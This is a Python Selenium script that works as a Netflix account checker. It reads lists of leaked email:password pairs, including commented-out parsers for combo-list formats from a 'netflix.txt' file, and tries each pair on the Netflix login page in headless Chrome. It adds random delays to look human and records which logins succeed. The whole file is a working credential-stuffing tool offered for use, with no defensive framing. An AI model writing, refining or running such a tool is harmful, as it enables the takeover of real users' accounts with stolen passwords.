import random
import re
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent  # Install this package

# Path to the credentials file
credentials_file_path = 'txt_file_path_credentials'

# Initialize WebDriver
chrome_options = Options()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.page_load_strategy = 'eager'

driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)

# List to store results
results = []


def read_credentials(file_path):
    """Reads credentials from the file and returns them as a list of tuples."""
    credentials = []
    with open(file_path, 'r') as f:
        for line in f:
            email, password = line.strip().split(':')
            credentials.append((email, password))
    # random.shuffle(credentials)
    return credentials

# def read_credentials(file_path):
#     credentials = []
#     with open(file_path, 'r') as file:
#         for line in file:
#             # Split the line into parts using ':' and '|' as delimiters
#             if ':' in line and '|' in line:
#                 email_password, _ = line.split('|', 1)
#                 email, password = email_password.split(':', 1)
#                 credentials.append((email.strip(), password.strip()))
#     return credentials

# def read_credentials(file_path):
#     credentials = []
#
#     # Regular expressions to identify email and password patterns
#     email_pattern = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
#     phone_pattern = re.compile(r'\+?\d{10,}')  # Matches numbers with or without a + prefix
#
#     # Read and parse the netflix.txt file
#     with open(file_path, "r") as file:
#         for line in file:
#             # Split line based on ':' delimiter
#             parts = line.strip().split(':')
#
#             # If the line has at least three parts
#             if len(parts) >= 3:
#                 # Check if the first part is a URL and if second part is an email or phone
#                 user_name = parts[1]
#                 password = parts[2]
#
#                 # Determine if user_name is an email or phone number
#                 if email_pattern.match(user_name) or phone_pattern.match(user_name):
#                     # Append (username, password) tuple to credentials list
#                     credentials.append((user_name, password))
#
#     return credentials


def random_delay():
    """Introduce a random delay to mimic human interaction."""
    time.sleep(random.uniform(4, 6))  # Random delay between 2 and 5 seconds


def check_login(email, password):
    """Attempts to log in to Netflix with the provided email and password."""
    try:
        # Go to Netflix login page
        driver.get("https://www.netflix.com/login")

        # Random delay before filling in the credentials
        random_delay()

        # Wait for the email input field to be present
        email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '[data-uia="login-field"]'))
        )
        password_input = driver.find_element(By.CSS_SELECTOR, '[data-uia="password-field"]')
        login_button = driver.find_element(By.CSS_SELECTOR, '[data-uia="login-submit-button"]')

        # Enter email and password
        email_input.clear()
        email_input.send_keys(email)
        random_delay()  # Random delay
        password_input.clear()
        password_input.send_keys(password)
        random_delay()  # Random delay

        # Click the login button
        login_button.click()

        # Wait to allow for page load
        WebDriverWait(driver, 10).until(EC.url_contains("browse"))

        # Check if login was successful
        if "browse" in driver.current_url:
            results.append((email, password, "Success"))
            print(f"Login successful for {email}")

    except Exception as e:
        results.append((email, password, f"Error: {e}"))
        print(f"Login failed for {email}: {e}")


def main():
    # Read credentials from file
    credentials = read_credentials(credentials_file_path)

    # Attempt login for each credential
    for email, password in credentials:
        check_login(email, password)

    # Close the WebDriver
    driver.quit()

    # Print and save results
    with open('login_results.txt', 'w') as f:
        for result in results:
            print(result)
            f.write(f"{result}\n")


if __name__ == "__main__":
    main()

# import re
#
# # Initialize the list to store credentials
# credentials = []
#
# # Regular expressions to identify email and password patterns
# email_pattern = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
# phone_pattern = re.compile(r'\+?\d{10,}')  # Matches numbers with or without a + prefix
#
# # Read and parse the netflix.txt file
# with open("netflix.txt", "r") as file:
#     for line in file:
#         # Split line based on ':' delimiter
#         parts = line.strip().split(':')
#
#         # If the line has at least three parts
#         if len(parts) >= 3:
#             # Check if the first part is a URL and if second part is an email or phone
#             user_name = parts[1]
#             password = parts[2]
#
#             # Determine if user_name is an email or phone number
#             if email_pattern.match(user_name) or phone_pattern.match(user_name):
#                 # Append (username, password) tuple to credentials list
#                 credentials.append((user_name, password))
#
# # Output the credentials list
# print(credentials)
